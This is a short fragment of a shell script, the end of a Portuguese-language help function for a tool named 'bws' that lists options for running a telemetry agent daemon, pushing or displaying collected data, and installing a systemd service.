    echo "Uso: bws [opcoes]"
    echo
    echo "  --serve       Inicia o daemon (agent mode)"
    echo "  -p, --once    Push telemetry uma vez"
    echo "  --collect     Exibe dados coletados (stdout)"
    echo "  --install     Instala servico systemd"
    echo "  -h, --help    Esta ajuda"
    echo "  -V, --version Versao"
    echo
    echo "Variavel de ambiente: osbin=<chave>"
    echo
}

